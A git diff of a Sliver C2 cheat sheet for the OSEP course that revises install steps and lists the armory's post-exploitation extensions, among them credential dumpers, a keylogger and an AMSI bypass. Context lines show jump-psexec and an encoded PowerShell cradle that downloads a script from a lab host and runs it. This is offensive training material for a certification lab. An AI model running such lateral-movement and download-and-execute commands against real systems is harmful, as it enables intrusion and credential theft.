@@ -1,14 +1,12 @@
-
 # Sliver CheatSheet for OSEP
 
-Considering the documentation of sliver is really bad, thought of creating this repository to help people with usage of Sliver C2 for OSEP. The guide is specific to OSEP but the usage should remain the same for real world projects.
+Creating this repository to help people with usage of Sliver C2 for OSEP. The guide is specific to OSEP but the usage should remain the same for real world projects. It is supposed to be treated as a cheatsheet for when you want to get something done and not want to spend time reading the documentation.
 
-It contains all my notes from the course content and challenge labs and is more than enough to do them and pass the exam. The notes are categorised by initial setup, compromise, privileges escalation, post exploitation and other sections.
+It contains all the notes from the course content and challenge labs and is more than enough to do them and pass the exam. The notes are categorised by initial setup, compromise, privileges escalation, post exploitation and other sections.
 
 The C# and PowerShell files throughout the cheat sheet should be publicly accessible, just search the tool name publicly. I have also compiled many of them during the duration of OSEP prep and have included them within the folder `bins` containing my structure, these would be detected as malicious if downloaded, feel free to download from the public repos and compile them. 
 
 ## Table of Contents
-
 
 - [Installation](#installation)
 	- [Server](#server)
@@ -136,37 +134,45 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 - [BOFs](#bofs)
 	- [jump-psexec](#jump-psexec)
 	- [jump-wmiexec](#jump-wmiexec)
+ - [Armory Packages List](#armory-packages-list)
 
 ## Installation
-Visit the sliver [releases page](https://github.com/BishopFox/sliver/releases) and install the pre-compiled Server and Client for your OS. Sliver also enables multiple operators to join using profiles since each operator can be generated a different profile.
+Visit the sliver [releases page](https://github.com/BishopFox/sliver/releases) and install the pre-compiled Server and Client for your OS. Sliver also enables multiple operators to join using profiles since each operator can be generated using a different profile.
 
 ### Server
 ```bash
-# Install suitable Binary for your OS
+# Install suitable Binary for your OS - Linux in this instance
 wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux
 chmod +x ./sliver-server_linux
 ./sliver-server_linux
 
+
 # Operator profile
 [server] sliver > new-operator -n <operator_name> -l <listening_IP>
-
 [*] Generating new client certificate, please wait ... 
 [*] Saved new client config to: /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 
 
+
 # Enabling Multiplayer mode
 [server] sliver > multiplayer
-
 [*] Multiplayer mode enabled!
 [*] <operator_name> has joined the game
 ```
-> **Note**: Without enabling the `multiplayer` mode, no one will be able to connect to Sliver's server.
+
+> **Note**: Without enabling the `multiplayer` mode, no one else will be able to connect to Sliver's server.
 
 ### Client
+
+Setting up the Sliver C2 client to connect with the server
+
 ```bash
+# Download the sliver client
 wget -q https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux
 chmod +x ./sliver-client_linux
-./sliver-client_linux import /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg 
-# After importing the profile start Client
+./sliver-client_linux import /<path_to_generated_profile>/<operator_name>_<listening _IP>.cfg
+
+
+# After importing the profile, start the client
 ./sliver-client_linux 
 ```
 
@@ -178,169 +184,7 @@ sliver > armory install all
 
 ? Install 21 aliases and 140 extensions? Yes
 [*] Installing alias 'SharPersist' (v0.0.2) ... done!
-[*] Installing alias 'sqlrecon' (v3.8.0) ... done!
-[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
-[*] Installing alias 'SharpView' (v0.0.1) ... done!
-[*] Installing alias 'SharpHound v4' (v0.0.2) ... done!
-[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
-[*] Installing alias 'sharpsh' (v0.0.1) ... done!
-[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
-[*] Installing alias 'KrbRelayUp' (v0.0.2) ... done!
-[*] Installing alias 'Certify' (v0.0.4) ... done!
-[*] Installing alias 'SharpUp' (v0.0.2) ... done!
-[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
-[*] Installing alias 'SharpSCCM' (v2.0.12) ... done!
-[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
-[*] Installing alias 'Rubeus' (v0.0.25) ... done!
-[*] Installing alias 'NoPowerShell' (v0.0.2) ... done!
-[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
-[*] Installing alias 'SharpDPAPI' (v0.0.4) ... done!
-[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
-[*] Installing alias 'Seatbelt' (v0.0.6) ... done!
-[*] Installing alias 'SharpChrome' (v0.0.4) ... done!
-[*] Installing extension 'ldapsigncheck' (v0.0.1) ... done!
-[*] Installing extension 'c2tc-psx' (v0.0.9) ... done!
-[*] Installing extension 'remote-shspawnas' (v0.1.1) ... done!
-[*] Installing extension 'remote-sc-create' (v0.1.1) ... done!
-[*] Installing extension 'inject-ntqueueapcthread' (v0.1.1) ... done!
-[*] Installing extension 'sa-get-netsession' (v0.0.23) ... done!
-[*] Installing extension 'jump-wmiexec' (v0.0.2) ... done!
-[*] Installing extension 'sa-nettime' (v0.0.23) ... done!
-[*] Installing extension 'remote-reg-save' (v0.1.1) ... done!
-[*] Installing extension 'handlekatz' (v0.0.1) ... done!
-[*] Installing extension 'sa-sc-qfailure' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-psw' (v0.0.9) ... done!
-[*] Installing extension 'inject-svcctrl' (v0.1.1) ... done!
-[*] Installing extension 'c2tc-psm' (v0.0.9) ... done!
-[*] Installing extension 'remote-schtasks-delete' (v0.1.1) ... done!
-[*] Installing extension 'sa-adcs-enum-com2' (v0.0.23) ... done!
-[*] Installing extension 'sa-schtasksquery' (v0.0.23) ... done!
-[*] Installing extension 'credman' (v1.0.7) ... done!
-[*] Installing extension 'nanorobeus' (v0.0.2) ... done!
-[*] Installing extension 'sa-get-password-policy' (v0.0.23) ... done!
-[*] Installing extension 'remote-setuserpass' (v0.1.1) ... done!
-[*] Installing extension 'tgtdelegation' (v0.0.4) ... done!
-[*] Installing extension 'sa-netstat' (v0.0.23) ... done!
-[*] Installing extension 'sa-sc-qdescription' (v0.0.23) ... done!
-[*] Installing extension 'delegationbof' (v0.0.2) ... done!
-[*] Installing extension 'raw-keylogger' (v0.0.7) ... done!
-[*] Installing extension 'inject-clipboard' (v0.1.1) ... done!
-[*] Installing extension 'remote-sc-start' (v0.1.1) ... done!
-[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
-[*] Installing extension 'remote-chrome-key' (v0.1.1) ... done!
-[*] Installing extension 'remote-reg-set' (v0.1.1) ... done!
-[*] Installing extension 'sa-adv-audit-policies' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-psk' (v0.0.9) ... done!
-[*] Installing extension 'sa-netlocalgroup2' (v0.0.23) ... done!
-[*] Installing extension 'sa-notepad' (v0.0.23) ... done!
-[*] Installing extension 'sa-driversigs' (v0.0.23) ... done!
-[*] Installing extension 'nanodump' (v0.0.5) ... done!
-[*] Installing extension 'sa-listdns' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-petitpotam' (v0.0.9) ... done!
-[*] Installing extension 'sa-list_firewall_rules' (v0.0.23) ... done!
-[*] Installing extension 'sa-cacls' (v0.0.23) ... done!
-[*] Installing extension 'sa-ldapsearch' (v0.0.23) ... done!
-[*] Installing extension 'sa-routeprint' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-smbinfo' (v0.0.9) ... done!
-[*] Installing extension 'sa-netshares' (v0.0.23) ... done!
-[*] Installing extension 'remote-get_priv' (v0.1.1) ... done!
-[*] Installing extension 'sa-ipconfig' (v0.0.23) ... done!
-[*] Installing extension 'inject-dde' (v0.1.1) ... done!
-[*] Installing extension 'remote-reg-delete' (v0.1.1) ... done!
-[*] Installing extension 'remote-adduser' (v0.1.1) ... done!
-[*] Installing extension 'inject-createremotethread' (v0.1.1) ... done!
-[*] Installing extension 'bof-servicemove' (v0.0.1) ... done!
-[*] Installing extension 'sa-vssenum' (v0.0.23) ... done!
-[*] Installing extension 'sa-regsession' (v0.0.23) ... done!
-[*] Installing extension 'inject-setthreadcontext' (v0.1.1) ... done!
-[*] Installing extension 'sa-adcs-enum-com' (v0.0.23) ... done!
-[*] Installing extension 'sa-schtasksenum' (v0.0.23) ... done!
-[*] Installing extension 'remote-procdump' (v0.1.1) ... done!
-[*] Installing extension 'sa-wmi-query' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-domaininfo' (v0.0.9) ... done!
-[*] Installing extension 'remote-sc_failure' (v0.1.1) ... done!
-[*] Installing extension 'sa-whoami' (v0.0.23) ... done!
-[*] Installing extension 'secinject' (v0.0.1) ... done!
-[*] Installing extension 'remote-sc-delete' (v0.1.1) ... done!
-[*] Installing extension 'remote-addusertogroup' (v0.1.1) ... done!
-[*] Installing extension 'hollow' (v0.0.1) ... done!
-[*] Installing extension 'coff-loader' (v1.0.14) ... done!
-[*] Installing extension 'sa-enum-local-sessions' (v0.0.23) ... done!
-[*] Installing extension 'remote-unexpireuser' (v0.1.1) ... done!
-[*] Installing extension 'sa-reg-query' (v0.0.23) ... done!
-[*] Installing extension 'sa-sc-enum' (v0.0.23) ... done!
-[*] Installing extension 'hashdump' (v1.0.0) ... done!
-[*] Installing extension 'inject-ctray' (v0.1.1) ... done!
-[*] Installing extension 'sa-find-loaded-module' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-kerberoast' (v0.0.9) ... done!
-[*] Installing extension 'remote-schtasksrun' (v0.1.1) ... done!
-[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
-[*] Installing extension 'remote-office-tokens' (v0.1.1) ... done!
-[*] Installing extension 'sa-listmods' (v0.0.23) ... done!
-[*] Installing extension 'inline-execute-assembly' (v0.0.1) ... done!
-[*] Installing extension 'c2tc-psc' (v0.0.9) ... done!
-[*] Installing extension 'sa-sc-qtriggerinfo' (v0.0.23) ... done!
-[*] Installing extension 'syscalls_shinject' (v0.0.1) ... done!
-[*] Installing extension 'sa-locale' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-winver' (v0.0.9) ... done!
-[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
-[*] Installing extension 'sa-adcs-enum' (v0.0.23) ... done!
-[*] Installing extension 'sa-netloggedon2' (v0.0.23) ... done!
-[*] Installing extension 'remote-adcs-request' (v0.1.1) ... done!
-[*] Installing extension 'sa-nslookup' (v0.0.23) ... done!
-[*] Installing extension 'kerbrute' (v0.0.1) ... done!
-[*] Installing extension 'bof-roast' (v0.0.2) ... done!
-[*] Installing extension 'find-proc-handle' (v0.0.2) ... done!
-[*] Installing extension 'remote-enable-user' (v0.1.1) ... done!
-[*] Installing extension 'remote-slack_cookie' (v0.1.1) ... done!
-[*] Installing extension 'remote-sc-description' (v0.1.1) ... done!
-[*] Installing extension 'sa-uptime' (v0.0.23) ... done!
-[*] Installing extension 'sa-tasklist' (v0.0.23) ... done!
-[*] Installing extension 'sa-netuptime' (v0.0.23) ... done!
-[*] Installing extension 'inject-ntcreatethread' (v0.1.1) ... done!
-[*] Installing extension 'mimikatz' (v0.0.1) ... done!
-[*] Installing extension 'jump-psexec' (v0.0.2) ... done!
-[*] Installing extension 'sa-arp' (v0.0.23) ... done!
-[*] Installing extension 'sa-sc-qc' (v0.0.23) ... done!
-[*] Installing extension 'inject-conhost' (v0.1.1) ... done!
-[*] Installing extension 'sa-enum-filter-driver' (v0.0.23) ... done!
-[*] Installing extension 'winrm' (v0.0.1) ... done!
-[*] Installing extension 'remote-ghost_task' (v0.1.1) ... done!
-[*] Installing extension 'sa-env' (v0.0.23) ... done!
-[*] Installing extension 'remote-lastpass' (v0.1.1) ... done!
-[*] Installing extension 'remote-sc-stop' (v0.1.1) ... done!
-[*] Installing extension 'c2tc-lapsdump' (v0.0.9) ... done!
-[*] Installing extension 'sa-netlocalgroup' (v0.0.23) ... done!
-[*] Installing extension 'remote-suspendresume' (v0.1.1) ... done!
-[*] Installing extension 'c2tc-spray-ad' (v0.0.9) ... done!
-[*] Installing extension 'scshell' (v0.0.2) ... done!
-[*] Installing extension 'sa-netview' (v0.0.23) ... done!
-[*] Installing extension 'inject-tooltip' (v0.1.1) ... done!
-[*] Installing extension 'remote-process-destroy' (v0.1.1) ... done!
-[*] Installing extension 'unhook-bof' (v0.0.2) ... done!
-[*] Installing extension 'sa-sc-query' (v0.0.23) ... done!
-[*] Installing extension 'inject-uxsubclassinfo' (v0.1.1) ... done!
-[*] Installing extension 'c2tc-askcreds' (v0.0.9) ... done!
-[*] Installing extension 'remote-schtasks-stop' (v0.1.1) ... done!
-[*] Installing extension 'sa-windowlist' (v0.0.23) ... done!
-[*] Installing extension 'c2tc-kerbhash' (v0.0.9) ... done!
-[*] Installing extension 'c2tc-addmachineaccount' (v0.0.9) ... done!
-[*] Installing extension 'sa-netgroup' (v0.0.23) ... done!
-[*] Installing extension 'sa-get-netsession2' (v0.0.23) ... done!
-[*] Installing extension 'sa-probe' (v0.0.23) ... done!
-[*] Installing extension 'find-module' (v0.0.2) ... done!
-[*] Installing extension 'inject-kernelcallbacktable' (v0.1.1) ... done!
-[*] Installing extension 'threadless-inject' (v0.0.1) ... done!
-[*] Installing extension 'remote-process-list-handles' (v0.1.1) ... done!
-[*] Installing extension 'c2tc-wdtoggle' (v0.0.9) ... done!
-[*] Installing extension 'c2tc-startwebclient' (v0.0.9) ... done!
-[*] Installing extension 'sa-netloggedon' (v0.0.23) ... done!
-[*] Installing extension 'remote-sc-config' (v0.1.1) ... done!
-[*] Installing extension 'patchit' (v0.0.1) ... done!
-[*] Installing extension 'c2tc-klist' (v0.0.9) ... done!
-
-[*] All packages installed
-
+... Complete output at the end ...
 ```
 
 ## Q & A
@@ -2702,6 +2546,178 @@ jump-psexec dc04 AgentSvc /home/kali/OSEP/hav0c/sliver.x64.exe //dc04/c$/file2.e
 
 ```powershell
 jump-wmiexec client09 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
+```
+
+
+## Armory Packages List
+
+```
+sliver > armory install all
+
+? Install 21 aliases and 140 extensions? Yes
+[*] Installing alias 'SharPersist' (v0.0.2) ... done!
+[*] Installing alias 'sqlrecon' (v3.8.0) ... done!
+[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!
+[*] Installing alias 'SharpView' (v0.0.1) ... done!
+[*] Installing alias 'SharpHound v4' (v0.0.2) ... done!
+[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
+[*] Installing alias 'sharpsh' (v0.0.1) ... done!
+[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
+[*] Installing alias 'KrbRelayUp' (v0.0.2) ... done!
+[*] Installing alias 'Certify' (v0.0.4) ... done!
+[*] Installing alias 'SharpUp' (v0.0.2) ... done!
+[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
+[*] Installing alias 'SharpSCCM' (v2.0.12) ... done!
+[*] Installing alias 'SharpRDP' (v0.0.1) ... done!
+[*] Installing alias 'Rubeus' (v0.0.25) ... done!
+[*] Installing alias 'NoPowerShell' (v0.0.2) ... done!
+[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
+[*] Installing alias 'SharpDPAPI' (v0.0.4) ... done!
+[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
+[*] Installing alias 'Seatbelt' (v0.0.6) ... done!
+[*] Installing alias 'SharpChrome' (v0.0.4) ... done!
+[*] Installing extension 'ldapsigncheck' (v0.0.1) ... done!
+[*] Installing extension 'c2tc-psx' (v0.0.9) ... done!
+[*] Installing extension 'remote-shspawnas' (v0.1.1) ... done!
+[*] Installing extension 'remote-sc-create' (v0.1.1) ... done!
+[*] Installing extension 'inject-ntqueueapcthread' (v0.1.1) ... done!
+[*] Installing extension 'sa-get-netsession' (v0.0.23) ... done!
+[*] Installing extension 'jump-wmiexec' (v0.0.2) ... done!
+[*] Installing extension 'sa-nettime' (v0.0.23) ... done!
+[*] Installing extension 'remote-reg-save' (v0.1.1) ... done!
+[*] Installing extension 'handlekatz' (v0.0.1) ... done!
+[*] Installing extension 'sa-sc-qfailure' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-psw' (v0.0.9) ... done!
+[*] Installing extension 'inject-svcctrl' (v0.1.1) ... done!
+[*] Installing extension 'c2tc-psm' (v0.0.9) ... done!
+[*] Installing extension 'remote-schtasks-delete' (v0.1.1) ... done!
+[*] Installing extension 'sa-adcs-enum-com2' (v0.0.23) ... done!
+[*] Installing extension 'sa-schtasksquery' (v0.0.23) ... done!
+[*] Installing extension 'credman' (v1.0.7) ... done!
+[*] Installing extension 'nanorobeus' (v0.0.2) ... done!
+[*] Installing extension 'sa-get-password-policy' (v0.0.23) ... done!
+[*] Installing extension 'remote-setuserpass' (v0.1.1) ... done!
+[*] Installing extension 'tgtdelegation' (v0.0.4) ... done!
+[*] Installing extension 'sa-netstat' (v0.0.23) ... done!
+[*] Installing extension 'sa-sc-qdescription' (v0.0.23) ... done!
+[*] Installing extension 'delegationbof' (v0.0.2) ... done!
+[*] Installing extension 'raw-keylogger' (v0.0.7) ... done!
+[*] Installing extension 'inject-clipboard' (v0.1.1) ... done!
+[*] Installing extension 'remote-sc-start' (v0.1.1) ... done!
+[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
+[*] Installing extension 'remote-chrome-key' (v0.1.1) ... done!
+[*] Installing extension 'remote-reg-set' (v0.1.1) ... done!
+[*] Installing extension 'sa-adv-audit-policies' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-psk' (v0.0.9) ... done!
+[*] Installing extension 'sa-netlocalgroup2' (v0.0.23) ... done!
+[*] Installing extension 'sa-notepad' (v0.0.23) ... done!
+[*] Installing extension 'sa-driversigs' (v0.0.23) ... done!
+[*] Installing extension 'nanodump' (v0.0.5) ... done!
+[*] Installing extension 'sa-listdns' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-petitpotam' (v0.0.9) ... done!
+[*] Installing extension 'sa-list_firewall_rules' (v0.0.23) ... done!
+[*] Installing extension 'sa-cacls' (v0.0.23) ... done!
+[*] Installing extension 'sa-ldapsearch' (v0.0.23) ... done!
+[*] Installing extension 'sa-routeprint' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-smbinfo' (v0.0.9) ... done!
+[*] Installing extension 'sa-netshares' (v0.0.23) ... done!
+[*] Installing extension 'remote-get_priv' (v0.1.1) ... done!
+[*] Installing extension 'sa-ipconfig' (v0.0.23) ... done!
+[*] Installing extension 'inject-dde' (v0.1.1) ... done!
+[*] Installing extension 'remote-reg-delete' (v0.1.1) ... done!
+[*] Installing extension 'remote-adduser' (v0.1.1) ... done!
+[*] Installing extension 'inject-createremotethread' (v0.1.1) ... done!
+[*] Installing extension 'bof-servicemove' (v0.0.1) ... done!
+[*] Installing extension 'sa-vssenum' (v0.0.23) ... done!
+[*] Installing extension 'sa-regsession' (v0.0.23) ... done!
+[*] Installing extension 'inject-setthreadcontext' (v0.1.1) ... done!
+[*] Installing extension 'sa-adcs-enum-com' (v0.0.23) ... done!
+[*] Installing extension 'sa-schtasksenum' (v0.0.23) ... done!
+[*] Installing extension 'remote-procdump' (v0.1.1) ... done!
+[*] Installing extension 'sa-wmi-query' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-domaininfo' (v0.0.9) ... done!
+[*] Installing extension 'remote-sc_failure' (v0.1.1) ... done!
+[*] Installing extension 'sa-whoami' (v0.0.23) ... done!
+[*] Installing extension 'secinject' (v0.0.1) ... done!
+[*] Installing extension 'remote-sc-delete' (v0.1.1) ... done!
+[*] Installing extension 'remote-addusertogroup' (v0.1.1) ... done!
+[*] Installing extension 'hollow' (v0.0.1) ... done!
+[*] Installing extension 'coff-loader' (v1.0.14) ... done!
+[*] Installing extension 'sa-enum-local-sessions' (v0.0.23) ... done!
+[*] Installing extension 'remote-unexpireuser' (v0.1.1) ... done!
+[*] Installing extension 'sa-reg-query' (v0.0.23) ... done!
+[*] Installing extension 'sa-sc-enum' (v0.0.23) ... done!
+[*] Installing extension 'hashdump' (v1.0.0) ... done!
+[*] Installing extension 'inject-ctray' (v0.1.1) ... done!
+[*] Installing extension 'sa-find-loaded-module' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-kerberoast' (v0.0.9) ... done!
+[*] Installing extension 'remote-schtasksrun' (v0.1.1) ... done!
+[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
+[*] Installing extension 'remote-office-tokens' (v0.1.1) ... done!
+[*] Installing extension 'sa-listmods' (v0.0.23) ... done!
+[*] Installing extension 'inline-execute-assembly' (v0.0.1) ... done!
+[*] Installing extension 'c2tc-psc' (v0.0.9) ... done!
+[*] Installing extension 'sa-sc-qtriggerinfo' (v0.0.23) ... done!
+[*] Installing extension 'syscalls_shinject' (v0.0.1) ... done!
+[*] Installing extension 'sa-locale' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-winver' (v0.0.9) ... done!
+[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
+[*] Installing extension 'sa-adcs-enum' (v0.0.23) ... done!
+[*] Installing extension 'sa-netloggedon2' (v0.0.23) ... done!
+[*] Installing extension 'remote-adcs-request' (v0.1.1) ... done!
+[*] Installing extension 'sa-nslookup' (v0.0.23) ... done!
+[*] Installing extension 'kerbrute' (v0.0.1) ... done!
+[*] Installing extension 'bof-roast' (v0.0.2) ... done!
+[*] Installing extension 'find-proc-handle' (v0.0.2) ... done!
+[*] Installing extension 'remote-enable-user' (v0.1.1) ... done!
+[*] Installing extension 'remote-slack_cookie' (v0.1.1) ... done!
+[*] Installing extension 'remote-sc-description' (v0.1.1) ... done!
+[*] Installing extension 'sa-uptime' (v0.0.23) ... done!
+[*] Installing extension 'sa-tasklist' (v0.0.23) ... done!
+[*] Installing extension 'sa-netuptime' (v0.0.23) ... done!
+[*] Installing extension 'inject-ntcreatethread' (v0.1.1) ... done!
+[*] Installing extension 'mimikatz' (v0.0.1) ... done!
+[*] Installing extension 'jump-psexec' (v0.0.2) ... done!
+[*] Installing extension 'sa-arp' (v0.0.23) ... done!
+[*] Installing extension 'sa-sc-qc' (v0.0.23) ... done!
+[*] Installing extension 'inject-conhost' (v0.1.1) ... done!
+[*] Installing extension 'sa-enum-filter-driver' (v0.0.23) ... done!
+[*] Installing extension 'winrm' (v0.0.1) ... done!
+[*] Installing extension 'remote-ghost_task' (v0.1.1) ... done!
+[*] Installing extension 'sa-env' (v0.0.23) ... done!
+[*] Installing extension 'remote-lastpass' (v0.1.1) ... done!
+[*] Installing extension 'remote-sc-stop' (v0.1.1) ... done!
+[*] Installing extension 'c2tc-lapsdump' (v0.0.9) ... done!
+[*] Installing extension 'sa-netlocalgroup' (v0.0.23) ... done!
+[*] Installing extension 'remote-suspendresume' (v0.1.1) ... done!
+[*] Installing extension 'c2tc-spray-ad' (v0.0.9) ... done!
+[*] Installing extension 'scshell' (v0.0.2) ... done!
+[*] Installing extension 'sa-netview' (v0.0.23) ... done!
+[*] Installing extension 'inject-tooltip' (v0.1.1) ... done!
+[*] Installing extension 'remote-process-destroy' (v0.1.1) ... done!
+[*] Installing extension 'unhook-bof' (v0.0.2) ... done!
+[*] Installing extension 'sa-sc-query' (v0.0.23) ... done!
+[*] Installing extension 'inject-uxsubclassinfo' (v0.1.1) ... done!
+[*] Installing extension 'c2tc-askcreds' (v0.0.9) ... done!
+[*] Installing extension 'remote-schtasks-stop' (v0.1.1) ... done!
+[*] Installing extension 'sa-windowlist' (v0.0.23) ... done!
+[*] Installing extension 'c2tc-kerbhash' (v0.0.9) ... done!
+[*] Installing extension 'c2tc-addmachineaccount' (v0.0.9) ... done!
+[*] Installing extension 'sa-netgroup' (v0.0.23) ... done!
+[*] Installing extension 'sa-get-netsession2' (v0.0.23) ... done!
+[*] Installing extension 'sa-probe' (v0.0.23) ... done!
+[*] Installing extension 'find-module' (v0.0.2) ... done!
+[*] Installing extension 'inject-kernelcallbacktable' (v0.1.1) ... done!
+[*] Installing extension 'threadless-inject' (v0.0.1) ... done!
+[*] Installing extension 'remote-process-list-handles' (v0.1.1) ... done!
+[*] Installing extension 'c2tc-wdtoggle' (v0.0.9) ... done!
+[*] Installing extension 'c2tc-startwebclient' (v0.0.9) ... done!
+[*] Installing extension 'sa-netloggedon' (v0.0.23) ... done!
+[*] Installing extension 'remote-sc-config' (v0.1.1) ... done!
+[*] Installing extension 'patchit' (v0.0.1) ... done!
+[*] Installing extension 'c2tc-klist' (v0.0.9) ... done!
+
+[*] All packages installed
 ```
 
 
